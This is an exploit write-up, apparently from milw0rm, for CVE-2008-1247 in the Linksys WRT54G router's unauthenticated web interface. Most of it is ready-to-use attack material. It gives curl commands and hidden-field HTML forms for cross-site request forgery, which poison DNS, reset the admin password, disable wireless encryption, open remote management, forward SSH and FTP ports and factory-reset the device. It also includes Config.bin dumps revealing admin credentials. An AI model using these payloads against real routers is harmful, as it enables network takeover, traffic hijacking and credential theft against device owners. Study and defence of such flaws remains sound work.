@@ -1,0 +1,677 @@
+                                                   regurgitated by: meathive
+                                                       url: kinqpinz.info ;]
+				             Tue, 05 Feb 2008 07:51:41 -0700
+############################################################################
+CVE-2008-1247
+WRT54G firmware version: v1.00.9
+Default LAN IP: 192.168.1.1
+Default auth: user:blank - pass:admin
+Authorization: Basic OmFkbWlu
+php > print base64_decode("OmFkbWlu");
+:admin
+https://kinqpinz.info/lib/wrt54g/
+Refer to the above URL for demonstrations!
+
+The official CVE -- http://nvd.nist.gov/nvd.cfm?cvename=CVE-2008-1247 -- entry for these vulnerabilities confirm that although the complexity of these attacks is low, their impact is extremely high.
+############################################################################
+
+                        /******************************
+			* No Authentication Required! *
+			******************************/
+
+############################################################################
+What:
+poison dns.
+dns 1 = 1.2.3.4
+dns 2 = 5.6.7.8
+dns 3 = 9.8.7.6
+
+Where:
+http://192.168.1.1/Basic.tri?dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=1&dns0_1=2&dns0_2=3&dns0_3=4&dns1_0=5&dns1_1=6&dns1_2=7&dns1_3=8&dns2_0=9&dns2_1=8&dns2_2=7&dns2_3=6&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en
+
+How:
+curl -d "dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=1&dns0_1=2&dns0_2=3&dns0_3=4&dns1_0=5&dns1_1=6&dns1_2=7&dns1_3=8&dns2_0=9&dns2_1=8&dns2_2=7&dns2_3=6&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en" http://192.168.1.1/Basic.tri
+############################################################################
+What:
+restore factory defaults.
+
+Where:
+http://192.168.1.1/factdefa.tri?FactoryDefaults=Yes&layout=en
+
+How:
+curl -d "FactoryDefaults=Yes&layout=en" http://192.168.1.1/factdefa.tri
+############################################################################
+What:
+restore basic setup options to default.
+
+Where:
+http://192.168.1.1/Basic.tri?dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en
+
+How: 
+curl -d "dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en" http://192.168.1.1/Basic.tri
+############################################################################
+What: 
+reset administrative password to 'asdf'.
+
+Where:
+http://192.168.1.1/manage.tri?remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=0&upnp_enable=1&layout=en
+
+How:
+curl -d "remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=0&upnp_enable=1&layout=en" http://192.168.1.1/manage.tri
+############################################################################
+What: 
+enable mixed wireless network mode with SSID 'pwnage' on channel 6, SSID broadcasting enabled.
+
+Where:
+http://192.168.1.1/WBasic.tri?submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=pwnage&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en
+
+How: 
+curl -d "submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=pwnage&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en" http://192.168.1.1/WBasic.tri 
+############################################################################
+What: 
+disable all wireless encryption.
+
+Where:
+http://192.168.1.1/Security.tri?SecurityMode=0&layout=en
+
+How: 
+curl -d "SecurityMode=0&layout=en" http://192.168.1.1/Security.tri
+############################################################################
+What: 
+disable wireless MAC filtering.
+
+Where:
+http://192.168.1.1/WFilter.tri?wl_macmode1=0
+
+How: 
+curl -d "wl_macmode1=0" http://192.168.1.1/WFilter.tri
+############################################################################
+What: 
+enable DMZ to ip 192.168.1.100.
+
+Where:
+http://192.168.1.1/dmz.tri?action=Apply&dmz_enable=1&dmz_ipaddr=100&layout=en
+
+How: 
+curl -d "action=Apply&dmz_enable=1&dmz_ipaddr=100&layout=en" http://192.168.1.1/dmz.tri
+############################################################################
+What: 
+disable DMZ.
+
+Where:
+http://192.168.1.1/dmz.tri?action=Apply&dmz_enable=0&layout=en
+
+How: 
+curl -d "action=Apply&dmz_enable=0&layout=en" http://192.168.1.1/dmz.tri
+############################################################################
+What: 
+enable remote management on port 31337 with password 'asdf', wireless web access and UPnP enabled.
+
+Where:
+http://192.168.1.1/manage.tri?remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=1&http_wanport=31337&upnp_enable=1&layout=en
+
+How: 
+curl -d "remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=1&http_wanport=31337&upnp_enable=1&layout=en" http://192.168.1.1/manage.tri
+############################################################################
+
+                        /******************************
+			******      Defaults:    ******
+			******************************/
+			
+############################################################################
+Setup->Basic Setup:
+POST /Basic.tri dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en
+############################################################################
+Setup->DDNS:
+POST /ddns.tri ddns_enable=0
+############################################################################
+Setup->MAC Address Clone:
+POST /WanMac.tri action=Apply&mac_clone_enable=0
+############################################################################
+Setup->Advanced Routing:
+POST /AdvRoute.tri action=Apply&bSRoute=1&oldOpMode=0&wk_mode=0&route_page=0&route_name=&route_ipaddr_0=0&route_ipaddr_1=0&route_ipaddr_2=0&route_ipaddr_3=0&route_netmask_0=0&route_netmask_1=0&route_netmask_2=0&route_netmask_3=0&route_gateway_0=0&route_gateway_1=0&route_gateway_2=0&route_gateway_3=0&route_ifname=0
+############################################################################
+Wireless->Basic Wireless Settings:
+POST /WBasic.tri submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=linksys&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en
+############################################################################
+Wireless->Wireless Security:
+POST /Security.tri SecurityMode=0&layout=en
+############################################################################
+Wireless->Wireless MAC Filter:
+POST /WFilter.tri wl_macmode1=0
+############################################################################
+Wireless->Advanced Wireless Settings:
+POST /Advanced.tri AuthType=0&basicrate=default&wl_rate=0&wMode=3&sectype=0&ctspmode=off&FrameBurst=off&BeaconInterval=100&Dtim=1&FragLen=2346&RTSThre=2347&apisolation=0&apSESmode=1
+############################################################################
+Security->Firewall:
+POST /fw.tri ident_pass=1&action=Apply&block_wan=1&IGMP=1&_ident_pass=1
+############################################################################
+Security->VPN:
+POST /vpn.tri action=Apply&ipsec_pass=1&pptp_pass=1&l2tp_pass=1
+############################################################################
+Access Restrictions->Internet Access:
+POST /filter.tri action=Apply&f_id=0&f_status1=disable&f_name=&f_status2=1&day_all=1&time_all=1&FROM_AMPM=0&TO_AMPM=0&blocked_service0=NONE&blocked_service1=NONE&host0=&host1=&host2=&host3=&url0=&url1=&url2=&url3=&url4=&url5=
+############################################################################
+Applications & Gaming->Port Range Forward:
+POST /PortRange.tri action=Apply&RuleID_0=0&name0=&from0=0&to0=0&pro0=both&ip0=0&RuleID_1=0&name1=&from1=0&to1=0&pro1=both&ip1=0&RuleID_2=0&name2=&from2=0&to2=0&pro2=both&ip2=0&RuleID_3=0&name3=&from3=0&to3=0&pro3=both&ip3=0&RuleID_4=0&name4=&from4=0&to4=0&pro4=both&ip4=0&RuleID_5=0&name5=&from5=0&to5=0&pro5=both&ip5=0&RuleID_6=0&name6=&from6=0&to6=0&pro6=both&ip6=0&RuleID_7=0&name7=&from7=0&to7=0&pro7=both&ip7=0&RuleID_8=0&name8=&from8=0&to8=0&pro8=both&ip8=0&RuleID_9=0&name9=&from9=0&to9=0&pro9=both&ip9=0
+############################################################################
+Applications & Gaming->Port Triggering:
+POST /ptrigger.tri RuleID_0=&service_name0=&tfrom0=0&tto0=0&rfrom0=0&rto0=0&RuleID_1=&service_name1=&tfrom1=0&tto1=0&rfrom1=0&rto1=0&RuleID_2=&service_name2=&tfrom2=0&tto2=0&rfrom2=0&rto2=0&RuleID_3=&service_name3=&tfrom3=0&tto3=0&rfrom3=0&rto3=0&RuleID_4=&service_name4=&tfrom4=0&tto4=0&rfrom4=0&rto4=0&RuleID_5=&service_name5=&tfrom5=0&tto5=0&rfrom5=0&rto5=0&RuleID_6=&service_name6=&tfrom6=0&tto6=0&rfrom6=0&rto6=0&RuleID_7=&service_name7=&tfrom7=0&tto7=0&rfrom7=0&rto7=0&RuleID_8=&service_name8=&tfrom8=0&tto8=0&rfrom8=0&rto8=0&RuleID_9=&service_name9=&tfrom9=0&tto9=0&rfrom9=0&rto9=0&trinamelist=&layout=en
+############################################################################
+Applications & Gaming->DMZ:
+POST /dmz.tri action=Apply&dmz_enable=0&layout=en
+############################################################################
+Applications & Gaming->QoS:
+POST /qos.tri hport_priority_1=0&hport_priority_2=0&hport_priority_3=0&hport_priority_4=0&hport_flow_control_1=1&hport_flow_control_2=1&hport_flow_control_3=1&hport_flow_control_4=1&happname1=&hport1priority=0&happport1=0&happname2=&hport2priority=0&happport2=0&happname3=&hport3priority=0&happport3=0&happname4=&hport4priority=0&happport4=0&happname5=&hport5priority=0&happport5=0&happname6=&hport6priority=0&happport6=0&happname7=&hport7priority=0&happport7=0&happname8=&hport8priority=0&happport8=0&QoS=0&wl_wme=off&layout=en
+############################################################################
+Administration->Management:
+POST /manage.tri remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=d6nw5v1x2pc7st9m&http_passwdConfirm=d6nw5v1x2pc7st9m&_http_enable=1&web_wl_filter=1&remote_management=0&upnp_enable=1&layout=en
+############################################################################
+Administration->Log:
+POST /ctlog.tri log_enable=0
+############################################################################
+Administration->Diagnostics->Ping:
+POST /ping.tri action=start&ping_ip=kinqpinz.info&ping_times=5
+############################################################################
+Administration->Diagnostics->Trace Route:
+POST /tracert.tri action=start&traceroute_ip=kinqpinz.info
+############################################################################
+Administration->Factory Defaults:
+############################################################################
+Administration->Firmware Upgrade:
+############################################################################
+Administration->Config Management:
+############################################################################
+Status->Router->DHCP Release:
+POST /rstatus.tri action=release&wan_pro=0&conn_stats=4294967295&layout=en
+############################################################################
+Status->Router->DHCP Renew:
+POST /rstatus.tri action=renew&wan_pro=0&conn_stats=4294967295&layout=en
+############################################################################
+Status->Local Network:
+############################################################################
+Status->Wireless:
+############################################################################
+
+A couple new things I've found inside the default configuration file, http://192.168.1.1/Config.bin. 
+The router uses a military NTP server, ntp2.usno.navy.mil, for synchronizing time. 
+The device's virtual memory/file system info is located at /mem/pricf/0, which I'm still exploring. 
+The only reference I've found in regards to /mem/pricf/0, by the way, is on a Korean site so it's still relatively new territory. 
+
+By simply viewing the ASCII within Config.bin we can view the administrative user name and password, external and internal IPs, router name, available service configurations, and so on. 
+
+It becomes more interesting when the device is not left in default mode as more information is available pertaining to what is and isn't left on. 
+
+The firmware seems to come from a company named Intoto, http://www.intoto.com/company.shtml.
+
+Here is a dump of Config.bin using the default settings:
+############################################################################
+TROC
+/mem/pricf/0
+(c) 2001 Copyright Intoto, Inc
+5VGWJ
+WRT54G
+linksysrouter
+self
+ntp2.usno.navy.mil
+root
+00000000000000
+mirror0
+None
+None
+httpSharenet
+mirror0
+httpSharenet
+httpSubnet
+httpSharenet
+httpSubnet
+19192.168.1.1
+httpSharenet
+httpSubnet
+PPPOE
+PPPOE
+PPTP
+PPTP
+L2TP
+L2TP
+PPPOE
+PPPoE
+Med=vl1,AC=,Fr=Sync
+PPTP
+PPTP
+:M-2:I-0.0.0.0:F-2:B-2
+L2TP
+L2TP
+M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
+Intoto
+IntotoSoft
+Intoto
+WANIPConn1
+WANIPConn1
+----
+admin
+admin
+linksys
+long
+default
+langpak_en
+PING
+TFTP
+IMAP
+HTTPS
+SNMP
+NNTP
+POP3
+SMTP
+HTTP
+TELNET
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+DefaultTcp
+DefaultUdp
+DefaultIcmp
+ftpinac
+dnsinac
+hainac
+gatekeeper
+msgudp
+tftp
+pcanywhere
+l2tp
+rtsp554
+rtsp7070
+h323
+msgtcp
+pptp
+n2pe
+cuseeme
+mszone
+CORP
+SELF
+DefPoly
+DefISAKMP
+DefPPTP
+DefL2TP                                                                                                                 
+############################################################################
+I should mention that the external IP was available to me when I dumped Config.bin after making some changes in the Web interface. By default, it is not viewable. Here the admin password is 'asdf':
+############################################################################
+TROC
+/mem/pricf/0
+(c) 2001 Copyright Intoto, Inc
+5VGWJ
+WRT54G
+linksysrouter
+self
+ntp2.usno.navy.mil
+root
+00000000000000
+mirror0
+None
+None
+httpSharenet
+mirror0
+httpSharenet
+httpSubnet
+httpSharenet
+httpSubnet
+19192.168.1.1
+httpSharenet
+httpSubnet
+6868.87.85.98;68.87.69.146
+httpSharenet
+httpSubnet
+hshsd1.co.comcast.net.
+httpSharenet
+httpSubnet
+PPPOE
+PPPOE
+PPTP
+PPTP
+L2TP
+L2TP
+PPPOE
+PPPoE
+Med=vl1,AC=,Fr=Sync
+PPTP
+PPTP
+:M-2:I-0.0.0.0:F-2:B-2
+L2TP
+L2TP
+M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
+Intoto
+IntotoSoft
+Intoto
+WANIPConn1
+x.x.x.x -- external IP now exists!
+WANIPConn1
+admin
+asdf
+linksys
+long
+default
+langpak_en
+PING
+TFTP
+IMAP
+HTTPS
+SNMP
+NNTP
+POP3
+SMTP
+HTTP
+TELNET
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+DefaultTcp
+DefaultUdp
+DefaultIcmp
+ftpinac
+dnsinac
+hainac
+gatekeeper
+msgudp
+tftp
+pcanywhere
+l2tp
+rtsp554
+rtsp7070
+h323
+msgtcp
+pptp
+n2pe
+cuseeme
+mszone
+CORP
+SELF
+DefPoly
+DefISAKMP
+DefPPTP
+DefL2TP
+############################################################################
+These remaining entries are all from https://kinqpinz.info/lib/wrt54g/, my demo page, which demonstrate how simple HTML can be crafted to crack the device's security.
+############################################################################
+Poison DNS: static DNS 1 = 1.2.3.4; static DNS 2 = 5.6.7.8; static DNS 3 = 9.8.7.6:
+
+<form method="post" action="http://192.168.1.1/Basic.tri">
+<input type="hidden" name="dhcp_end" value="149">
+<input type="hidden" name="oldMtu" value="1500">
+<input type="hidden" name="oldLanSubnet" value="0">
+<input type="hidden" name="OldWanMode" value="0">
+<input type="hidden" name="SDHCP1" value="192">
+<input type="hidden" name="SDHCP2" value="168">
+<input type="hidden" name="SDHCP3" value="1">
+<input type="hidden" name="SDHCP4" value="100">
+<input type="hidden" name="EDHCP1" value="192">
+<input type="hidden" name="EDHCP2" value="168">
+<input type="hidden" name="EDHCP3" value="1">
+<input type="hidden" name="EDHCP4" value="150">
+<input type="hidden" name="pd" value="">
+<input type="hidden" name="now_proto" value="dhcp">
+<input type="hidden" name="old_domain" value="">
+<input type="hidden" name="chg_lanip" value="192.168.1.1">
+<input type="hidden" name="_daylight_time" value="1">
+<input type="hidden" name="wan_proto" value="0">
+<input type="hidden" name="router_name" value="WRT54G">
+<input type="hidden" name="wan_hostname" value="">
+<input type="hidden" name="wan_domain" value="">
+<input type="hidden" name="mtu_enable" value="0">
+<input type="hidden" name="lan_ipaddr_0" value="192">
+<input type="hidden" name="lan_ipaddr_1" value="168">
+<input type="hidden" name="lan_ipaddr_2" value="1">
+<input type="hidden" name="lan_ipaddr_3" value="1">
+<input type="hidden" name="lan_netmask" value="0">
+<input type="hidden" name="lan_proto" value="Enable">
+<input type="hidden" name="dhcp_start" value="100">
+<input type="hidden" name="dhcp_num" value="50">
+<input type="hidden" name="dhcp_lease" value="0">
+<input type="hidden" name="dns0_0" value="1">
+<input type="hidden" name="dns0_1" value="2">
+<input type="hidden" name="dns0_2" value="3">
+<input type="hidden" name="dns0_3" value="4">
+<input type="hidden" name="dns1_0" value="5">
+<input type="hidden" name="dns1_1" value="6">
+<input type="hidden" name="dns1_2" value="7">
+<input type="hidden" name="dns1_3" value="8">
+<input type="hidden" name="dns2_0" value="9">
+<input type="hidden" name="dns2_1" value="8">
+<input type="hidden" name="dns2_2" value="7">
+<input type="hidden" name="dns2_3" value="6">
+<input type="hidden" name="wins_0" value="0">
+<input type="hidden" name="wins_1" value="0">
+<input type="hidden" name="wins_2" value="0">
+<input type="hidden" name="wins_3" value="0">
+<input type="hidden" name="time_zone" value="%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29">
+<input type="hidden" name="daylight_time" value="ON">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Reset administrative password to 'asdf':
+
+<form method="post" action="http://192.168.1.1/manage.tri">
+<input type="hidden" name="remote_mgt_https" value="0">
+<input type="hidden" name="http_enable" value="1">
+<input type="hidden" name="https_enable" value="0">
+<input type="hidden" name="PasswdModify" value="1">
+<input type="hidden" name="http_passwd" value="asdf">
+<input type="hidden" name="http_passwdConfirm" value="asdf">
+<input type="hidden" name="_http_enable" value="1">
+<input type="hidden" name="web_wl_filter" value="1">
+<input type="hidden" name="remote_management" value="0">
+<input type="hidden" name="upnp_enable" value="1">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Enable mixed wireless network mode with SSID 'pwnage' on channel 6, SSID broadcasting enabled:
+
+<form method="post" action="http://192.168.1.1/WBasic.tri">
+<input type="hidden" name="submit_type" value="">
+<input type="hidden" name="channelno" value="11">
+<input type="hidden" name="OldWirelessMode" value="3">
+<input type="hidden" name="Mode" value="3">
+<input type="hidden" name="SSID" value="pwnage">
+<input type="hidden" name="channel" value="6">
+<input type="hidden" name="Freq" value="6">
+<input type="hidden" name="wl_closed" value="1">
+<input type="hidden" name="sesMode" value="1">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Disable all wireless encryption:
+
+<form method="post" action="http://192.168.1.1/Security.tri">
+<input type="hidden" name="SecurityMode" value="0">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Disable wireless MAC filtering:
+
+<form method="post" action="http://192.168.1.1/WFilter.tri">
+<input type="hidden" name="wl_macmodel" value="0">
+<input type="submit">
+</form>
+############################################################################
+Enable DMZ to 192.168.1.100:
+
+<form method="post" action="http://192.168.1.1/dmz.tri">
+<input type="hidden" name="action" value="Apply">
+<input type="hidden" name="dmz_enable" value="1">
+<input type="hidden" name="dmz_ipaddr" value="100">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Disable DMZ:
+
+<form method="post" action="http://192.168.1.1/dmz.tri">
+<input type="hidden" name="action" value="Apply">
+<input type="hidden" name="dmz_enable" value="0">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Enable remote management on port 31337 with password 'asdf', wireless web access and UPnP enabled:
+
+<form method="post" action="http://192.168.1.1/manage.tri">
+<input type="hidden" name="remote_mgt_https" value="0">
+<input type="hidden" name="http_enable" value="1">
+<input type="hidden" name="https_enable" value="0">
+<input type="hidden" name="PasswdModify" value="1">
+<input type="hidden" name="http_passwd" value="asdf">
+<input type="hidden" name="http_passwdConfirm" value="asdf">
+<input type="hidden" name="_http_enable" value="1">
+<input type="hidden" name="web_wl_filter" value="1">
+<input type="hidden" name="remote_management" value="1">
+<input type="hidden" name="http_wanport" value="31337">
+<input type="hidden" name="upnp_enable" value="1">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Enable port forwarding on port 22, SSH, using TCP/UDP to 192.168.1.100:
+
+<form method="post" action="http://192.168.1.1/PortRange.tri">
+<input type="hidden" name="action" value="Apply">
+<input type="hidden" name="RuleID_0" value="0">
+<input type="hidden" name="name0" value="ssh">
+<input type="hidden" name="from0" value="22">
+<input type="hidden" name="to0" value="22">
+<input type="hidden" name="pro0" value="both">
+<input type="hidden" name="ip0" value="100">
+<input type="hidden" name="enable0" value="on">
+<input type="submit">
+</form>
+############################################################################
+Enable port forwarding on port 21, FTP, using TCP/UDP to 192.168.1.100:
+
+<form method="post" action="http://192.168.1.1/PortRange.tri">
+<input type="hidden" name="action" value="Apply">
+<input type="hidden" name="RuleID_0" value="0">
+<input type="hidden" name="name0" value="ftp">
+<input type="hidden" name="from0" value="21">
+<input type="hidden" name="to0" value="21">
+<input type="hidden" name="pro0" value="both">
+<input type="hidden" name="ip0" value="100">
+<input type="hidden" name="enable0" value="on">
+<input type="submit">
+</form>
+############################################################################
+Enable port triggering on ports 21 & 22, FTP & SSH, respectively:
+
+<form method="post" action="http://192.168.1.1/ptrigger.tri">
+<input type="hidden" name="RuleID_0" value="2">
+<input type="hidden" name="service_name0" value="ssh">
+<input type="hidden" name="tfrom0" value="22">
+<input type="hidden" name="tto0" value="22">
+<input type="hidden" name="rfrom0" value="22">
+<input type="hidden" name="rto0" value="22">
+<input type="hidden" name="penable0" value="on">
+<input type="hidden" name="RuleID_1" value="2">
+<input type="hidden" name="service_name1" value="ftp">
+<input type="hidden" name="tfrom1" value="21">
+<input type="hidden" name="tto1" value="21">
+<input type="hidden" name="rfrom1" value="21">
+<input type="hidden" name="rto1" value="21">
+<input type="hidden" name="penable1" value="on">
+<input type="submit">
+</form>
+############################################################################
+Enable incoming/outgoing log:
+
+<form method="post" action="http://192.168.1.1/ctlog.tri">
+<input type="hidden" name="log_enable" value="1">
+<input type="submit">
+</form>
+############################################################################
+Disable incoming/outgoing log:
+
+<form method="post" action="http://192.168.1.1/ctlog.tri">
+<input type="hidden" name="log_enable" value="0">
+<input type="submit">
+</form>
+############################################################################
+Ping a target URL five times:
+
+<form method="post" action="http://192.168.1.1/ping.tri">
+<input type="hidden" name="action" value="start">
+<input type="hidden" name="ping_ip" value="kinqpinz.info">
+<input type="hidden" name="ping_times" value="5">
+<input type="submit">
+</form>
+############################################################################
+Trace route a target URL:
+
+<form method="post" action="http://192.168.1.1/tracert.tri">
+<input type="hidden" name="action" value="start">
+<input type="hidden" name="traceroute_ip" value="kinqpinz.info">
+<input type="submit">
+</form>
+############################################################################
+DHCP release dynamic IP:
+
+<form method="post" action="http://192.168.1.1/rstatus.tri">
+<input type="hidden" name="action" value="release">
+<input type="hidden" name="wan_pro" value="0">
+<input type="hidden" name="conn_stats" value="4294967295">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+DHCP renew dynamic IP:
+
+<form method="post" action="http://192.168.1.1/rstatus.tri">
+<input type="hidden" name="action" value="renew">
+<input type="hidden" name="wan_pro" value="0">
+<input type="hidden" name="conn_stats" value="4294967295">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Enable VPN (IPSec/PPTP/L2TP) passthrough:
+
+<form method="post" action="http://192.168.1.1/vpn.tri">
+<input type="hidden" name="action" value="Apply">
+<input type="hidden" name="ipsec_pass" value="1">
+<input type="hidden" name="pptp_pass" value="1">
+<input type="hidden" name="l2tp_pass" value="1">
+<input type="submit">
+</form>
+############################################################################
+Disable VPN (IPSec/PPTP/L2TP) passthrough:
+
+<form method="post" action="http://192.168.1.1/vpn.tri">
+<input type="hidden" name="action" value="Apply">
+<input type="hidden" name="ipsec_pass" value="0">
+<input type="hidden" name="pptp_pass" value="0">
+<input type="hidden" name="l2tp_pass" value="0">
+<input type="submit">
+</form>
+############################################################################
+Restore factory defaults:
+
+<form method="post" action="http://192.168.1.1/factdefa.tri">
+<input type="hidden" name="FactoryDefaults" value="Yes">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+Backup current configuration:
+
+<form method="get" action="http://192.168.1.1/Config.bin">
+<input type="hidden" name="butAction" value="Backup">
+<input type="hidden" name="file" value="">
+<input type="hidden" name="layout" value="en">
+<input type="submit">
+</form>
+############################################################################
+
+# milw0rm.com [2008-03-26]
